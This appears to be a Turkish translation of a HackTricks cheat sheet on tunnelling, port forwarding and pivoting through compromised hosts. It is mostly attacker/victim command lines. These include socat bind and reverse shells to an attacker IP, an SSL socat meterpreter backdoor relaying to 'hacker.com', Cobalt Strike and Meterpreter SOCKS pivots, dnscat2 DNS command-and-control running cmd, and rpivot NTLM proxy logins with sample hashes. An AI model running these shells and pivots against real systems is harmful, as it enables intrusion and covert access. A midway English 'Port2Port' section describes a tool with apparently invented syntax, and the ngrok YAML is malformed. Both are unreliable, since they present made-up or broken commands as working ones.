# Tünelleme ve Port Yönlendirme

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Try Hard Güvenlik Grubu**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Nmap ipucu

{% hint style="warning" %}
**ICMP** ve **SYN** taramaları çorap proxy'ler aracılığıyla tünellenemez, bu nedenle bu işlem için **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve **TCP taramalarını belirtmeliyiz** (`-sT`).
{% endhint %}

## **Bash**

**Ana Bilgisayar -> Atlama -> DahiliA -> DahiliB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafik bağlantısı (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Yerel Port2Port

SSH Sunucusunda yeni bir bağlantı noktası açın --> Diğer bağlantı noktası
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Yerel port --> Kompromize edilmiş ana bilgisayar (SSH) --> Üçüncü\_kutu:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Yerel Port --> Kompromize edilmiş ana makine (SSH) --> Herhangi bir yer
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Ters Port Yönlendirme

Bu, iç ağdaki iç sunuculardan ters kabuk almak için DMZ üzerinden kendi sunucunuza ulaşmanızı sağlar:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tünel

Her iki cihazda da **root yetkisine** ihtiyacınız var (yeni arayüzler oluşturacağınız için) ve sshd yapılandırmasının root girişine izin vermesi gerekmektedir:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Sunucu tarafında yönlendirmeyi etkinleştirin.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Müşteri tarafında yeni bir rota belirleyin
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Tüm trafiği bir ana makine üzerinden bir alt ağa **ssh** ile **tünelleyebilirsiniz**.\
Örneğin, 10.10.10.0/24'e giden tüm trafiği yönlendirebilirsiniz.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Özel anahtar ile bağlantı kurun
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Yerel port --> Kompromize edilmiş ana makine (aktif oturum) --> Üçüncü\_kutu:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) protokolü, ağ trafiğini bir ağ üzerinden yönlendirmek için kullanılan bir protokoldür. SOCKS sunucusu, istemci isteklerini alır, kimlik doğrulamasını yapar ve ardından istemci isteğini hedef sunucuya ileterek trafiği yönlendirir. Bu, ağ trafiğini güvenli bir şekilde tünellemek için kullanılabilir.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Başka bir yöntem:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Takım sunucusunda dinleyen bir port açın ve tüm arayüzlerde kullanılabilecek şekilde **trafiği beacon üzerinden yönlendirmek için** kullanın.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Bu durumda, **liman, işaretçi ana bilgisayarında açılır**, Takım Sunucusunda değil ve trafik Takım Sunucusuna ve oradan belirtilen ana bilgisayar:limana gönderilir.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
- Beacon'ın ters port yönlendirmesi, **trafiği Takım Sunucusuna tünelleme amacıyla tasarlanmıştır, bireysel makineler arasında iletim için değil**.
- Trafik, Beacon'ın C2 trafiği içinde **tünellenir**, P2P bağlantıları da içerir.
- Yüksek portlarda ters port yönlendirmeleri oluşturmak için **Yönetici ayrıcalıklarına ihtiyaç duyulmaz**.

### rPort2Port yerel

{% hint style="warning" %}
Bu durumda, **port Beacon ana bilgisayarında açılır**, Takım Sunucusunda değil ve trafik **Cobalt Strike istemcisine gönderilir** (Takım Sunucusuna değil) ve oradan belirtilen ana bilgisayar:port'a iletilir.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Web dosya tüneli yüklemeniz gerekmektedir: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) sayfasından indirebilirsiniz.\
**İstemci ve sunucu için aynı sürümü kullanmanız gerekmektedir**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port yönlendirme
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Ters tünel. Tünel kurban tarafından başlatılır.\
127.0.0.1:1080 üzerinde bir socks4 vekil sunucu oluşturulur.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** üzerinden pivot yapın
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bağlama kabuğu
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Ters kabuk
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

---

Port2Port, a simple port forwarding tool, can be used to forward traffic from one port to another on the same machine or across different machines. This tool can be useful during penetration testing when pivoting through multiple compromised hosts. 

#### Usage

To forward traffic from port 1234 to port 5678 on the same machine, use the following command:

```bash
port2port -l 1234 -r 5678
```

To forward traffic from port 1234 on one machine to port 5678 on another machine with IP address `10.0.0.2`, use the following command:

```bash
port2port -l 1234 -r 5678 -d 10.0.0.2
```

Port2Port can also be used to forward traffic over SSH by specifying the SSH username and hostname:

```bash
port2port -l 1234 -r 5678 -ssh user@hostname
```

#### Conclusion

Port2Port is a versatile tool that can be used for port forwarding within the same machine or across different machines, making it a valuable asset during penetration testing scenarios.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Socks üzerinden Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat ile Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Kurbanın konsolunda son yerine bu satırı çalıştırarak **kimlik doğrulaması yapılmamış bir proxy**'yi atlayabilirsiniz:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tüneli

**/bin/sh konsolu**

Her iki tarafta da sertifikalar oluşturun: İstemci ve Sunucu
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Uzaktan Port2Port

Yerel SSH portunu (22) saldırganın ana bilgisayarının 443 portuna bağlayın
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Bu, konsol PuTTY sürümü gibidir (seçenekler bir ssh istemcisiyle çok benzerdir).

Bu ikili, kurban üzerinde yürütüleceği için ve bir ssh istemcisi olduğu için, ters bağlantıya sahip olabilmek için ssh hizmetimizi ve bağlantı noktamızı açmamız gerekmektedir. Ardından, yalnızca yerel olarak erişilebilir bağlantı noktasını makinedeki bir bağlantı noktasına yönlendirmek için:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Herhangi bir bağlantı noktası için yerel yönetici olmanız gerekmektedir.
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP ve Proxifier

Sisteme **RDP erişimine** ihtiyacınız var.\
İndir:

1. [SocksOverRDP x64 İkili Dosyaları](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Hizmeti özelliğinden `Dynamic Virtual Channels` (`DVC`) kullanır. DVC, **paketleri RDP bağlantısı üzerinden tünelleme**den sorumludur.
2. [Proxifier Taşınabilir İkili](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınıza şu şekilde **`SocksOverRDP-Plugin.dll`** yükleyin:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Şimdi **`mstsc.exe`** kullanarak **RDP** üzerinden **hedefe bağlanabiliriz**, ve **SocksOverRDP eklentisinin etkinleştirildiğini** belirten bir **diyalog kutusu** almalıyız ve **127.0.0.1:1080** üzerinde **dinleyecektir**.

**RDP** üzerinden bağlanın ve **`SocksOverRDP-Server.exe`** ikili dosyasını **hedef makinede yükleyip çalıştırın**:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Şimdi, makinenizde (saldırgan) 1080 numaralı portun dinlemede olduğunu doğrulayın:
```
netstat -antb | findstr 1080
```
Şimdi o trafiği o bağlantı noktası üzerinden vekil sunucu aracılığıyla yönlendirmek için [**Proxifier**](https://www.proxifier.com/) **kullanabilirsiniz.**

## Windows GUI Uygulamalarını Vekil Yapma

Windows GUI uygulamalarını bir vekil aracılığıyla gezinmek için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.\
**Profil -> Vekil Sunucular** bölümüne SOCKS sunucusunun IP'sini ve bağlantı noktasını ekleyin.\
**Profil -> Vekillik Kuralları** bölümüne vekilleştirmek istediğiniz programın adını ve vekilleştirmek istediğiniz IP'lerin bağlantılarını ekleyin.

## NTLM vekil atlatma

Önceden bahsedilen araç: **Rpivot**\
**OpenVPN** ayrıca bunu atlayabilir, yapılandırma dosyasında bu seçenekleri ayarlayarak:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Bu, bir proxy'e kimlik doğrulaması yapar ve belirttiğiniz harici hizmete yönlendirilen yerel bir bağlantı noktası bağlar. Daha sonra, bu bağlantı noktası aracılığıyla istediğiniz aracı kullanabilirsiniz.\
Örneğin, 443 numaralı bağlantı noktasını yönlendirir.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Şimdi, örneğin kurbanın **SSH** servisini 443 numaralı porta dinlemesi için ayarlarsanız, saldırgan 2222 numaralı porta bağlanabilir.\
Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı porta dinler.

## YARP

Microsoft tarafından oluşturulan bir ters proxy. [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy) adresinde bulabilirsiniz.

## DNS Tünellemesi

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

DNS sorgularını kullanarak iki sistem arasında tüneller oluşturmak için her iki sistemde de kök yetkisi gereklidir.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tünel çok yavaş olacak. Bu tünel aracılığıyla sıkıştırılmış bir SSH bağlantısı oluşturabilirsiniz:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**

DNS üzerinden bir C\&C kanalı oluşturur. Kök yetkilerine ihtiyaç duymaz.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell'de**

PowerShell'de bir dnscat2 istemcisini çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat ile port yönlendirme**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Proxychains DNS'ini Değiştirme

Proxychains, `gethostbyname` libc çağrısını engeller ve tcp DNS isteğini socks proxy üzerinden tünel oluşturur. **Varsayılan olarak**, proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (sabitlenmiş). Değiştirmek için, dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. Eğer **Windows ortamında** iseniz, **alan denetleyicisinin** IP'sini ayarlayabilirsiniz.

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tünellemesi

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Her iki sistemde de kök erişimi gereklidir, tun adaptörleri oluşturmak ve ICMP echo isteklerini kullanarak aralarında veri tünellemek için.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) bir komut satırında internete çözümleri açığa çıkarmak için bir araçtır.**
*Sunum URI'leri şuna benzer:* **UID.ngrok.io**

### Kurulum

- Bir hesap oluşturun: https://ngrok.com/signup
- İstemci indirme:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Temel kullanımlar

**Belgeler:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Mevcut ise kimlik doğrulama ve TLS eklemek de mümkündür.*

#### TCP Tünellemesi
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP ile dosyaların açığa çıkarılması
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP çağrılarını dinleme

*XSS, SSRF, SSTI için kullanışlıdır...*
Doğrudan stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) adresinden erişilebilir.
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml basit yapılandırma örneği

3 tünel açar:
- 2 TCP
- 1 HTTP, /tmp/httpbin/ dizininden statik dosyaların sunumu ile
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Kontrol etmek için diğer araçlar

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir **cybersecurity şirketinde mi çalışıyorsunuz? Şirketinizin **HackTricks'te reklamını görmek** ister misiniz? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
